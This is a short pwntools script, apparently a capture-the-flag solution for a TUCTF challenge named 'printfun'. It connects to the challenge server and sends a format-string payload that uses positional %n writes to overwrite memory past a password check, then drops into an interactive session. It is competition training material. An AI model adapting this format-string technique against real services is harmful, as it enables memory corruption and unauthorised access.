from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./printfun')
else:
	host, port = "chal.tuctf.com", 30501
	r = remote(host, port)

raw_input('debug')

r.recvuntil('password? ')
buf = '%' + str(64) + 'x%7$n'
buf += '%6$n'
r.sendline(buf)

r.interactive()
r.close()